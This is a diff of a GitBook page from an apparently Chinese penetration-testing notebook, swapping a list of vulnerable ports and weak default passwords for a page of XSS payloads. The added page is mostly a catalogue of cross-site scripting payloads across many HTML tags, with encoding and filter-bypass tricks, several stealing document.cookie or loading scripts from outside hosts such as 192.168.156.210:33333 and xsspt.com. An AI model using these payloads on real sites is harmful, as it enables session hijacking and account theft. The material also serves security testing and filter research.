@@ -4,7 +4,7 @@
     <head>
         <meta charset="UTF-8">
         <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
-        <title>04-常见端口漏洞 · GitBook</title>
+        <title>06-xss_payload · GitBook</title>
         <meta http-equiv="X-UA-Compatible" content="IE=edge" />
         <meta name="description" content="">
         <meta name="generator" content="GitBook 3.2.3">
@@ -69,10 +69,10 @@
     <link rel="shortcut icon" href="../gitbook/images/favicon.ico" type="image/x-icon">
 
     
-    <link rel="next" href="05-sql注入.html" />
+    <link rel="next" href="07-webshell.md" />
     
     
-    <link rel="prev" href="03-linux常用命令.html" />
+    <link rel="prev" href="05-sql注入.html" />
     
 
     </head>
@@ -636,7 +636,7 @@
             
         </li>
     
-        <li class="chapter active" data-level="4.1.4" data-path="04-常见端口漏洞.html">
+        <li class="chapter " data-level="4.1.4" data-path="04-常见端口漏洞.html">
             
                 <a href="04-常见端口漏洞.html">
             
@@ -662,7 +662,7 @@
             
         </li>
     
-        <li class="chapter " data-level="4.1.6" data-path="06-xss_payload.html">
+        <li class="chapter active" data-level="4.1.6" data-path="06-xss_payload.html">
             
                 <a href="06-xss_payload.html">
             
@@ -1015,7 +1015,7 @@
     <!-- Title -->
     <h1>
         <i class="fa fa-circle-o-notch fa-spin"></i>
-        <a href=".." >04-常见端口漏洞</a>
+        <a href=".." >06-xss_payload</a>
     </h1>
 </div>
 
@@ -1030,56 +1030,329 @@
     
                                 <section class="normal markdown-section">
                                 
-                                <h2 id="04-&#x5E38;&#x89C1;&#x7AEF;&#x53E3;&#x6F0F;&#x6D1E;">04-&#x5E38;&#x89C1;&#x7AEF;&#x53E3;&#x6F0F;&#x6D1E;</h2>
-<h4 id="&#x4E00;&#x3001;&#x5E38;&#x89C1;&#x7AEF;&#x53E3;&#x6F0F;&#x6D1E;">&#x4E00;&#x3001;&#x5E38;&#x89C1;&#x7AEF;&#x53E3;&#x6F0F;&#x6D1E;</h4>
-<pre><code>21      FTP         &#x533F;&#x540D;&#x3001;&#x5F31;&#x53E3;&#x4EE4;
-22      SSH         &#x5F31;&#x53E3;&#x4EE4;&#x7206;&#x7834;
-23      Telnet      &#x5F31;&#x53E3;&#x4EE4;&#x7206;&#x7834;
-135     RPC         &#x901A;&#x8FC7;&#x8FDC;&#x7A0B;&#x8C03;&#x7528;&#x6267;&#x884C;&#x4EE3;&#x7801;
-137     NetBIOS     &#x83B7;&#x53D6;&#x76EE;&#x6807;&#x8BA1;&#x7B97;&#x673A;&#x7684;&#x76F8;&#x5173;&#x4FE1;&#x606F;
-161     Snmp        public&#x5F31;&#x53E3;&#x4EE4;
-389     ldap        &#x533F;&#x540D;&#x8BBF;&#x95EE;
-443     Openssl     &#x5FC3;&#x810F;&#x6EF4;&#x8840;
-445     Smb         &#x5F31;&#x53E3;&#x4EE4;&#xFF0C;ms_08067&#x7B49;1025
-873     Rsync       &#x533F;&#x540D;&#x8BBF;&#x95EE;&#xFF0C;&#x5F31;&#x53E3;&#x4EE4;
-1099    java rmi    &#x8FDC;&#x7A0B;&#x547D;&#x4EE4;&#x6267;&#x884C;
-1433    MSSQL       &#x5F31;&#x53E3;&#x4EE4;&#x7206;&#x7834;
-1521    Oracle      &#x5F31;&#x53E3;&#x4EE4;&#x7206;&#x7834;
-2049    Nfs         &#x914D;&#x7F6E;&#x4E0D;&#x5F53;
-2082/2083   Cpanel  &#x5F31;&#x53E3;&#x4EE4;&#x7206;&#x7834;
-2222    DA&#x865A;&#x62DF;&#x4E3B;&#x673A;  &#x9ED8;&#x8BA4;&#x5BC6;&#x7801;zebra
-2601/2604   zebra&#x8DEF;&#x7531;&#x5668; &#x8BF4;&#x660E;
-3128    Squid&#x4EE3;&#x7406;&#x7AEF;&#x53E3;   &#x6CA1;&#x8BBE;&#x7F6E;&#x53E3;&#x4EE4;&#xFF0C;&#x53EF;&#x76F4;&#x63A5;&#x5185;&#x7F51;&#x6F2B;&#x6E38;
-3306    Mysql       &#x5F31;&#x53E3;&#x4EE4;&#x7206;&#x7834;
-3312/3311   Kangle&#x4E3B;&#x673A;&#x767B;&#x5F55;  &#x8BF4;&#x660E;
-3389    RDP         &#x5F31;&#x53E3;&#x4EE4;&#x3001;SHIFT&#x540E;&#x95E8;&#x3001;&#x653E;&#x5927;&#x955C;
-4440    Rundeck     web
-4848    GlassFish   web&#x4E2D;&#x95F4;&#x4EF7;&#xFF0C;&#x5F31;&#x53E3;&#x4EE4; &#x5F31;&#x53E3;&#x4EE4;admin/adminadmin
-5432    postgresql  &#x5F31;&#x53E3;&#x4EE4;&#x63D0;&#x6743;
-5632    PyAnywhere  &#x6293;&#x5BC6;&#x7801;&#x3001;&#x4EE3;&#x7801;&#x6267;&#x884C;
-5900/5901/5902  VNC &#x5F31;&#x53E3;&#x4EE4;&#x7206;&#x7834;
-6379    Redis       &#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x3001;&#x53CD;&#x5F39;shell
-7001/7002   weblogic    &#x5F31;&#x53E3;&#x4EE4;&#x7206;&#x7834;
-8080    tomcat/jboos    &#x5F31;&#x53E3;&#x4EE4;
-9000    Fcgi        fcgi php&#x547D;&#x4EE4;&#x6267;&#x884C;
-9200    Elasticsearch   &#x4EE3;&#x7801;&#x6267;&#x884C;
-9043    websphere       &#x5F31;&#x53E3;&#x4EE4;&#x7206;&#x7834;
-9090    webshpere&#x63A7;&#x5236;&#x53F0; java&#x53CD;&#x5E8F;&#x5217;&#x5316;
-11211   Memcache        &#x5185;&#x5B58;&#x6CC4;&#x6F0F;
-27017/28017 mongodb     &#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;
-50060/50030 hadoop      web
-</code></pre><h4 id="&#x4E8C;&#x3001;&#x4EE3;&#x7406;&#x670D;&#x52A1;&#x5668;&#x5E38;&#x7528;&#x7AEF;&#x53E3;">&#x4E8C;&#x3001;&#x4EE3;&#x7406;&#x670D;&#x52A1;&#x5668;&#x5E38;&#x7528;&#x7AEF;&#x53E3;</h4>
-<pre><code>&#x4EE3;&#x7406;&#x670D;&#x52A1;&#x5668;&#x5E38;&#x7528;&#x4EE5;&#x4E0B;&#x7AEF;&#x53E3;&#xFF1A;
-&#xFF08;1&#xFF09;. HTTP&#x534F;&#x8BAE;&#x4EE3;&#x7406;&#x670D;&#x52A1;&#x5668;&#x5E38;&#x7528;&#x7AEF;&#x53E3;&#x53F7;&#xFF1A;80/8080/3128/8081/9080
-&#xFF08;2&#xFF09;. SOCKS&#x4EE3;&#x7406;&#x534F;&#x8BAE;&#x670D;&#x52A1;&#x5668;&#x5E38;&#x7528;&#x7AEF;&#x53E3;&#x53F7;&#xFF1A;1080
+                                <h2 id="06-xss-payload">06-xss payload</h2>
+<h4 id="&#x4E00;&#x3001;&#x73AF;&#x5883;&#x642D;&#x5EFA;">&#x4E00;&#x3001;&#x73AF;&#x5883;&#x642D;&#x5EFA;</h4>
+<pre><code>https://github.com/78778443/xssplatform
+</code></pre><h4 id="&#x4E8C;&#x3001;payload">&#x4E8C;&#x3001;payload</h4>
+<h5 id="script&#x6807;&#x7B7E;">script&#x6807;&#x7B7E;</h5>
+<pre><code>&#xBC;script&#xBE;alert(&#xA2;xss&#xA2;)&#xBC;/script&#xBE;
 
-Symantec AV/Filter for MSE ,&#x9ED8;&#x8BA4;&#x7AEF;&#x53E3;&#x53F7;&#x4E3A; 8081&#xFF1B;
-ORACLE EMCTL&#xFF0C;&#x9ED8;&#x8BA4;&#x7684;&#x7AEF;&#x53E3;&#x53F7;&#x4E3A;1158&#xFF1B;
-Oracle XDB&#xFF08; XML &#x6570;&#x636E;&#x5E93;&#xFF09;&#xFF0C;&#x9ED8;&#x8BA4;&#x7684;&#x7AEF;&#x53E3;&#x53F7;&#x4E3A;8080&#xFF1B;
-Oracle XDB FTP&#x670D;&#x52A1;&#xFF0C;&#x9ED8;&#x8BA4;&#x7684;&#x7AEF;&#x53E3;&#x53F7;&#x4E3A;2100&#xFF1B;
-MS SQL*SERVER&#x6570;&#x636E;&#x5E93;server&#xFF0C;&#x9ED8;&#x8BA4;&#x7684;&#x7AEF;&#x53E3;&#x53F7;&#x4E3A;1433/tcp 1433/udp&#xFF1B;
-MS SQL*SERVER&#x6570;&#x636E;&#x5E93;monitor&#xFF0C;&#x9ED8;&#x8BA4;&#x7684;&#x7AEF;&#x53E3;&#x53F7;&#x4E3A;1434/tcp 1434/udp&#xFF1B;
-QQ&#xFF0C;&#x9ED8;&#x8BA4;&#x7684;&#x7AEF;&#x53E3;&#x53F7;&#x4E3A;1080/udp
+%3Cscript%3Ealert(&apos;XSS&apos;)%3C/script%3E
+
+&lt;0x736372697074&gt;alert(&apos;XSS&apos;)&lt;/0x736372697074&gt;
+
+&lt;char(115,99,114,105,112,116)&gt;alert(&apos;XSS&apos;)&lt;/char(115,99,114,105,112,116)&gt;
+
+&lt;script language=JavaScript&gt;alert(&apos;XSS&apos;)&lt;/script&gt;
+
+&lt;ScRiPt&gt;prompt(1)&lt;/ScRiPt&gt;
+
+&lt;script&gt;co\u006efir\u006d`1`&lt;/script&gt;
+
+&lt;script&gt;eval(String.fromCharCode(97,108,101,114,116,40,39,105,110,115,105,103,104,116,45,108,97,98,115,39,41))&lt;/script&gt;
+
+&lt;script&gt;alert(&apos;XSS&apos;);&lt;/script&gt;
+
+&lt;script&gt;var myVar=&quot;XSS&quot;; alert(myVar)&lt;/script&gt;
+
+&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+
+&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;
+
+&lt;script&gt;alert&amp;#40/1/&amp;#41&lt;/script&gt;
+
+&lt;script&gt;`&lt;/div&gt;&lt;div&gt;`-alert(123)&lt;/script&gt;
+
+&lt;script&gt;`&lt;/div&gt;&lt;div&gt;`+alert(123)&lt;/script&gt;
+
+&lt;script&gt;`&lt;/div&gt;&lt;div&gt;`/alert(123)&lt;/script&gt;
+
+&lt;script&gt;`&lt;/div&gt;&lt;div&gt;`%alert(123)&lt;/script&gt;
+
+&lt;script&gt;`&lt;/div&gt;&lt;div&gt;`==alert(123)&lt;/script&gt;
+
+&lt;script src=http://baidu.com/&gt;&lt;/SCRIPT&gt;
+
+&lt;SCRIPT/XSS SRC=&quot;http://192.168.156.210:33333/&quot;&gt;&lt;/SCRIPT&gt;
+
+&lt;script/src=data:text/&amp;#x6a&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x000070&amp;#x074,alert(4)&gt;&lt;/script&gt;
+
+&lt;script&gt;location.href=&apos;http://1.1.1.1//&apos;+escape(document.cookie);&lt;/script&gt;
+
+&lt;SCRIPT&gt;document.write(&quot;&lt;SCRI&quot;);&lt;/SCRIPT&gt;PT src=&quot;http://1.1.1.1/&quot;&gt;&lt;/SCRIPT&gt;
+
+&lt;script&gt;a=eval;b=alert;a(b(/i/.source));&lt;/script&gt;
+
+&lt;SCRIPT a=&quot;&gt;&quot; SRC=&quot;http://ha.ckers.org/&quot;&gt;&lt;/SCRIPT&gt;
+
+&lt;script src=&quot;http://192.168.156.210:33333/&quot;&gt;&lt;/script&gt;
+
+&lt;SCRIPT&gt;document.write(&quot;&lt;SCRI&quot;);&lt;/SCRIPT&gt;PT src=&quot;http://192.168.156.210:33333/&quot;&gt;&lt;/SCRIPT&gt;
+
+&lt;script&gt;document.location=&apos;http://1.1.1.1&apos;;&lt;/script&gt;
+
+&lt;script&gt;window.open(&quot;http://192.168.156.210:33333/&quot;)&lt;/script&gt;
+</code></pre><h5 id="a&#x6807;&#x7B7E;">a&#x6807;&#x7B7E;</h5>
+<pre><code>&lt;a onclick=&quot;i=createElement(&apos;iframe&apos;);i.src=&apos;javascript:alert(/xss/)&apos;;x=parentNode;x.appendChild(i);&quot; href=&quot;#&quot;&gt;Test&lt;/a&gt;
+
+&lt;A href=http://192.168.156.210:33333/&gt;link&lt;/A&gt;
+
+&lt;a/href=javascript&amp;colon;co\u006efir\u006d&amp;#40;&amp;quot;/xss/&amp;quot;&amp;#41;&gt;/XSS/&lt;/a&gt;
+
+&lt;a href=javascript:alert(1)&gt;aaa&lt;/a&gt;
+
+&lt;a href=javascript:prompt(1)&gt;Clickme&lt;/a&gt;
+
+&lt;a href=&quot;javascript:\u0061lert(1)&quot;&gt;X    
+
+&lt;a/href=&quot;javascript:&amp;#13; javascript:prompt(1)&quot;&gt;&lt;input type=&quot;X&quot;&gt;    
+
+&lt;a href=&quot;javascript:confirm%28 1%29&quot;&gt;Clickme&lt;/a&gt;
+
+&lt;a href=&quot;javascrip&amp;#x0000000000000000074;:prompt(1)&quot;&gt;x&lt;/a&gt;
+
+&lt;a href=&quot;javascript:co\u006efir\u006d%28 1%29&quot;&gt;Clickme&lt;/a&gt;
+
+&lt;a href=&quot;javascript:x=open(&apos;http://192.168.156.210:33333/&apos;);&quot;&gt;Test&lt;/a&gt;    
+
+&lt;a href=&quot;&amp;#106&amp;#97&amp;#118&amp;#97&amp;#115&amp;#99&amp;#114&amp;#105&amp;#112&amp;#116&amp;#58&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116&amp;#40&amp;#49&amp;#41&quot;&gt;Test&lt;/a&gt;
+
+&lt;a onmouseover=location=&apos;javascript:alert(1)&apos;&gt;click
+
+&lt;a onmouseover=alert(document.cookie)&gt;xxs link&lt;/a&gt;
+
+&lt;a/href=javascript&amp;colon;co\u006efir\u006d&amp;#40;&amp;quot;1&amp;quot;&amp;#41;&gt;clickme&lt;/a&gt;
+
+&lt;a href=&quot;javascript:co\u006efir\u006d%28 1%29&quot;&gt;Clickme&lt;/a&gt;
+</code></pre><h5 id="img&#x6807;&#x7B7E;">img&#x6807;&#x7B7E;</h5>
+<pre><code>&lt;img src=http://127.0.0.1/myspace.asp&gt;
+
+&lt;img/&#xB5;/a\:script/src=x onerror=alert(1)//&gt;
+
+&lt;img src=x:alert(alt) onerror=eval(src) alt=0&gt;
+
+&lt;img/src==&quot;x onerror=alert(1)//&quot;&gt;
+
+&lt;img src=x onerror=alert(/i/)&gt;
+
+&lt;IMG SRC=/ onerror=&quot;alert(String.fromCharCode(88,83,83))&quot;&gt;&lt;/img&gt;
+
+&lt;img src=x onerror=confirm(1)&gt;
+
+&lt;img src=&quot;x:gif&quot; onerror=&quot;window[&apos;al\u0065rt&apos;](0)&quot;&gt;&lt;/img&gt;
+
+&lt;img src=x onerror=co\u006efir\u006d`1`&gt;
+
+&lt;img src=1.gif onerror=alert(1)&gt;
+
+&lt;img src=x onerror=prompt(1);&gt;
+
+&lt;img src=&quot;/&quot; =_=&quot; title=&quot;onerror=&apos;prompt(1)&apos;&quot;&gt;
+
+&lt;img src ?itworksonchrome?\/onerror = alert(1)&gt;
+
+&lt;img/*%00/src=&quot;worksinchrome&amp;colon;prompt(1)&quot;/%00*/onerror=&apos;eval(src)&apos;&gt;
+
+&lt;img onerror=&quot;location=&apos;javascript:%61lert(1)&apos;&quot; src=&quot;x&quot;&gt;
+
+&lt;img onerror=&quot;location=&apos;javascript:\x2561lert(1)&apos;&quot; src=&quot;x&quot;&gt;
+
+&lt;img onerror=&quot;location=&apos;javascript:\x255Cu0061lert(1)&apos;&quot; src=&quot;x&quot; &gt;
+
+&lt;img onerror=alert(0) src=&gt;
+
+&lt;img/id=&quot;confirm&amp;lpar;1)&quot;alt=&quot;/&quot;src=&quot;/&quot;onerror=eval(id)&gt;
+
+&lt;IMG SRC=# onmouseover=&quot;alert(&apos;1&apos;)&quot;&gt;
+</code></pre><h5 id="iframe&#x6807;&#x7B7E;">iframe&#x6807;&#x7B7E;</h5>
+<pre><code>&lt;iframe/src=javascript:prompt(1)&gt;
+
+&lt;iframe/src=&quot;javascript:alert`2`&quot;&gt;
+
+&lt;iframe src=&quot;javascript:alert(2)&quot;&gt;
+
+&lt;iframe/src=&quot;javascript:&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;`2`&quot;&gt;
+
+&lt;iframe src=&quot;javascript:%20%0aalert%20%0d %09(1)&quot;&gt;
+
+&lt;IFRAME SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;/IFRAME&gt;
+
+&lt;iframe src=http://baidu.com&gt;
+
+&lt;iframe src=&quot;data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C    
+%2F%73%63%72%69%70%74%3E&quot;&gt;&lt;/iframe&gt;
+
+&lt;iframe srcdoc=&quot;&amp;lt;img src&amp;equals;x:x onerror&amp;equals;alert&amp;lpar;1&amp;rpar;&amp;gt;&quot;&gt;
+
+&lt;iframe/onload=alert(/insight-labs/)&gt;
+
+&lt;iframe src=javascript&amp;colon;alert&amp;lpar;document&amp;period;location&amp;rpar;&gt;
+</code></pre><h5 id="details&#x6807;&#x7B7E;">details&#x6807;&#x7B7E;</h5>
+<pre><code>&lt;details open ontoggle=&quot;https://xsspt.com/ahcDid&quot;&gt;
+
+&lt;details/open/ontoggle=co\u006efir\u006d`1`&gt;
+
+&lt;details open ontoggle=&quot;alert(/x/);&quot;&gt;
+
+&lt;details ontoggle=alert(1)&gt;
+
+&lt;details/ontoggle=co\u006efir\u006d`1`&gt;
+
+&lt;details open ontoggle=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#24050;&amp;#26159;&amp;#40644;&amp;#26127;&amp;#29420;&amp;#33258;&amp;#24833;&amp;#65292;&amp;#19968;&amp;#26525;&amp;#32418;&amp;#26447;&amp;#20986;&amp;#22681;&amp;#26469;&amp;#39;&amp;#41;&quot;&gt;
+</code></pre><h5 id="input&#x6807;&#x7B7E;">input&#x6807;&#x7B7E;</h5>
+<pre><code>&lt;input/onmouseover=&quot;javaSCRIPT&amp;colon;confirm&amp;lpar;1&amp;rpar;&quot;&gt;
+
+&lt;input onblur=javascript:alert(1) autofocus&gt;&lt;input autofocus&gt;
+
+&lt;input autofocus onblur=alert(1)&gt;
+
+&lt;input value:aa/onclick=alert(/xss/)&gt;
+
+&lt;input onfocus=javascript:alert(1) autofocus&gt;
+
+&lt;input onfocus=alert(1) autofocus&gt;
+
+&lt;Input/Autofocus/%0D*/Onfocus=confirm`1`//&gt;
+
+&lt;Input/Autofocus/Onfocus=confirm`1`&gt;
+
+&lt;form&gt;&lt;input formaction=javascript:alert(1) type=image src=SOURCE&gt; 
+
+&lt;form&gt;&lt;input formaction=javascript:alert(1) type=submit value=click&gt;
+
+&lt;form&gt;&lt;input formaction=javascript:alert(1) type=image value=click&gt;
+
+&lt;form&gt;&lt;input formaction=javascript:alert(1) type=image src=http://1.1.1.1/&gt;
+
+&lt;/form&gt;&lt;input type&amp;#61;&quot;date&quot; onfocus=&quot;alert(1)&quot;&gt;
+
+&lt;input type=image src=x onerror=alert`XSS`&gt;
+
+&lt;input type=&quot;text&quot; value=&quot;&quot;onfocus=location=&apos;javascript:alert`1`&apos; autofocus&quot;&#x201D;/&gt;
+
+&lt;input type=&quot;text&quot; value=&quot;1&quot; onclick=&quot;alert(1)&quot; /&gt;
+
+&lt;input type=&quot;text&quot;value=&quot;&quot;onclick=&quot;location=window[`atob`]`amF2YXNjcmlwdDphbGVydChkb2N1bWVudC5kb21ha W4p`&quot;/&gt;
+</code></pre><h5 id="svg&#x6807;&#x7B7E;">svg&#x6807;&#x7B7E;</h5>
+<pre><code>&lt;svg/onload=alert(&apos;1&apos;)&gt;
+
+&lt;svg onload=alert(4)//
+
+&lt;svg/onload=prompt(5)&gt;
+
+&lt;svg/onload=co\u006efir\u006d`6`&gt;
+
+&lt;svg onload=&apos;JavascRipT:alert%287%29&apos;&gt;
+
+&lt;svg/onload =&quot;location=&apos;jav&apos;+&apos;ascript&apos;+&apos;:%2&apos;+&apos;0aler&apos;+&apos;t%20%2&apos;+&apos;81%&apos;+&apos;29&apos;&quot;&gt;
+
+&lt;svg/onload=setTimeout(&apos;alert(8)&apos;,0)&gt;
+
+&lt;iframe/src=&quot;data:text/html,&lt;svg onload=alert(1)&gt;&quot;&gt;
+
+&lt;iframe srcdoc=&quot;&lt;svg onload=alert(1)&amp;nvgt;&quot;&gt;&lt;/iframe&gt;
+</code></pre><h5 id="&#x5176;&#x5B83;&#x6807;&#x7B7E;">&#x5176;&#x5B83;&#x6807;&#x7B7E;</h5>
+<pre><code>&quot;onblur=alert(1) autofocusa=&quot;
+
+%c0%22;alert(1);    //&#x5BBD;&#x5B57;&#x8282;&#x7ED5;&#x8FC7;&#x8FC7;&#x6EE4;       
+
+&lt;isindex formaction=javascript:alert(/XSS/) type=submit&gt;
+
+&lt;aaaaa onclick=alert(1) src=x&gt;click
+
+&lt;audio src=x onerror=prompt(1)&gt;
+
+&lt;code onmouseover=a=eval;b=alert;a(b(/g/.source));&gt;HI&lt;/code&gt;
+
+&lt;a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=    j&amp;#97v&amp;#97script:&amp;#97lert(1)&gt;Click
+
+&lt;plaintext/onmouseover=prompt(2)&gt;
+
+&lt;L&#x531; onclick=alert(1)&gt;click me&lt;/L&#x531;&gt;
+
+&#x6700;&#x77ED;  
+&lt;s/onclick=alert()&gt;b
+
+&lt;video src=x onerror=prompt(1)&gt;
+
+&lt;video&gt;&lt;source onerror=&quot;alert(1)&quot;&gt;
+
+markdown xss:
+&#x8F93;&#x5165;&#xFF1A;[test](javascript://%0d%0aprompt(1);com)
+&#x8F93;&#x51FA;&#xFF1A;&lt;ahref=&quot;javascript://%0d%0aprompt(1);com&quot;&gt;test&lt;/a&gt;
+
+[color=red&apos; onmouseover=&apos;alert(&apos;xss&apos;)&apos;]mouse over[/color]
+
+&lt;form oninput=&quot;alert(1)&quot;&gt;&lt;input type=&quot;range&quot;&gt;
+
+&lt;form onsubmit=alert(1)&gt;&lt;input type=submit&gt;
+
+&lt;form action=&quot;Javascript:alert(1)&quot;&gt;&lt;input type=submit&gt; // Firefox, IE
+
+&lt;form/action=javascript&amp;#x3A;alert&amp;lpar;document&amp;period;cookie&amp;rpar;&gt;&lt;input/    type=&apos;submit&apos;&gt;//
+
+&lt;keygen onfocus=javascript:alert(1) autofocus&gt;  firefox
+
+&lt;select/keygen/textarea autofocus onfocus=alert(1)&gt;
+
+&lt;select onfocus=alert(1) autofocus&gt;
+
+&lt;embed src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;
+
+&lt;form id=&quot;test&quot;&gt;&lt;/form&gt;&lt;button form=&quot;test&quot; formaction=&quot;javascript:alert(1)&quot;&gt;X&lt;/    button&gt;
+
+&lt;form&gt;&lt;button formaction=javascript&amp;colon;alert(1)&gt;
+
+&lt;textarea autofocus onfocus=co\u006efir\u006d(1)&gt;
+
+&lt;textarea autofocus onfocus=prompt(2)&gt;
+
+&lt;p onmouseover=alert(/insight-labs/)&gt;insight-labs here.&lt;/p&gt;
+
+
+&lt;h1 onclick=co\u006efir\u006d(1)&gt;Clickme&lt;/h1&gt;
+
+&lt;h1 onclick=prompt(1)&gt;Clickme&lt;/h1&gt;
+
+&lt;object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg&gt;&lt;/object&gt;
+
+&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;
+
+&lt;OBJECT TYPE=&quot;text/x-scriptlet&quot; DATA=&quot;http://ha.ckers.org/&quot;&gt;&lt;/OBJECT&gt;
+
+&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=data:text/    html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K&quot;&gt;  &#x706B;&#x72D0;
+
+&lt;meta http-equiv=&quot;refresh&quot; content=&quot;5&quot;&gt;
+
+&lt;meta http-equiv=&quot;refresh&quot; content=&quot;1; url=http://baidu.com//&quot;&gt;
+
+&lt;frameset onload=alert(/insight-labs/)&gt;
+
+&lt;frameset onpageshow=&quot;alert(1)&quot;&gt;
+
+&lt;FRAMESET&gt;&lt;FRAME src=javascript:alert(&apos;XSS&apos;)&gt;&lt;/FRAME&gt;&lt;/FRAMESET&gt;
+
+&lt;frameset rows=&quot;100%&quot;&gt;&lt;frame noresize=&quot;noresize&quot; frameborder =&quot;0&quot; title=&quot;XSS     Found by HR&quot; src=&quot;http://baidu.com&quot;&gt;&lt;/frame&gt;&lt;/frameset&gt;
+
+&lt;div/onmouseover=&apos;alert(1)&apos;&gt;X&lt;/div&gt;
+
+&lt;div/style==&quot;x onclick=alert(1)//&quot;&gt;
+
+&lt;div style=behavior:url(&quot; onclick=alert(1)//&quot;&gt;XSS&apos;OR
+
+&lt;div style=x:x(&quot; onclick=alert(1)//&quot;&gt;XSS
+
+&lt;DIV STYLE=&quot;behaviour:url(&apos;http://xsspt.com/6Si1xA&apos;);&quot;&gt;
+
+&lt;STYLE&gt;@import&apos;http://ha.ckers.org/xss.css&apos;;&lt;/STYLE&gt;
+
+&lt;body onpageshow=&quot;alert(1)&quot;&gt;
+
+&lt;BODY ONLOAD=alert(&apos;2&apos;)&gt;
+
+&lt;body onLoad=&quot;document.location.href=&apos;http://ip.sb&apos;&quot;&gt;  //&#x8DF3;&#x8F6C;
+
+&lt;BODY ONLOAD=&quot;a();&quot;&gt;&lt;SCRIPT&gt;function a(){alert(&apos;XSS&apos;);}&lt;/SCRIPT&gt;
 </code></pre><footer class="page-footer"><span class="copyright">&#x8FC7;&#x6C5F;&#x9F99; all right reserved&#xFF0C;powered by Gitbook</span><span class="footer-modification">&#x8BE5;&#x6587;&#x4EF6;&#x4FEE;&#x8BA2;&#x65F6;&#x95F4;&#xFF1A;
 2020-06-13 15:38:27
 </span></footer>
@@ -1109,12 +1382,12 @@ QQ&#xFF0C;&#x9ED8;&#x8BA4;&#x7684;&#x7AEF;&#x53E3;&#x53F7;&#x4E3A;1080/udp
 
             
                 
-                <a href="03-linux常用命令.html" class="navigation navigation-prev " aria-label="Previous page: 03-linux常用命令">
+                <a href="05-sql注入.html" class="navigation navigation-prev " aria-label="Previous page: 05-sql注入">
                     <i class="fa fa-angle-left"></i>
                 </a>
                 
                 
-                <a href="05-sql注入.html" class="navigation navigation-next " aria-label="Next page: 05-sql注入">
+                <a href="07-webshell.md" class="navigation navigation-next " aria-label="Next page: 07-webshell">
                     <i class="fa fa-angle-right"></i>
                 </a>
                 
@@ -1125,7 +1398,7 @@ QQ&#xFF0C;&#x9ED8;&#x8BA4;&#x7684;&#x7AEF;&#x53E3;&#x53F7;&#x4E3A;1080/udp
     <script>
         var gitbook = gitbook || [];
         gitbook.push(function() {
-            gitbook.page.hasChanged({"page":{"title":"04-常见端口漏洞","level":"4.1.4","depth":2,"next":{"title":"05-sql注入","level":"4.1.5","depth":2,"path":"hack/05-sql注入.md","ref":"hack/05-sql注入.md","articles":[]},"previous":{"title":"03-linux常用命令","level":"4.1.3","depth":2,"path":"hack/03-linux常用命令.md","ref":"hack/03-linux常用命令.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":["tbfed-pagefooter","expandable-chapters","back-to-top-button","-lunr","livereload"],"pluginsConfig":{"tbfed-pagefooter":{"copyright":"过江龙","modify_label":"该文件修订时间：","modify_format":"YYYY-MM-DD HH:mm:ss"},"livereload":{},"search":{},"lunr":{"maxIndexSize":200000},"fontsettings":{"theme":"white","family":"sans","size":2},"highlight":{},"back-to-top-button":{},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"expandable-chapters":{}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"hack/04-常见端口漏洞.md","mtime":"2020-06-13T07:38:27.589Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2020-06-16T02:03:04.857Z"},"basePath":"..","book":{"language":""}});
+            gitbook.page.hasChanged({"page":{"title":"06-xss_payload","level":"4.1.6","depth":2,"next":{"title":"07-webshell","level":"4.1.7","depth":2,"path":"hack/07-webshell.md","ref":"hack/07-webshell.md","articles":[]},"previous":{"title":"05-sql注入","level":"4.1.5","depth":2,"path":"hack/05-sql注入.md","ref":"hack/05-sql注入.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":["tbfed-pagefooter","expandable-chapters","back-to-top-button","-lunr","livereload"],"pluginsConfig":{"tbfed-pagefooter":{"copyright":"过江龙","modify_label":"该文件修订时间：","modify_format":"YYYY-MM-DD 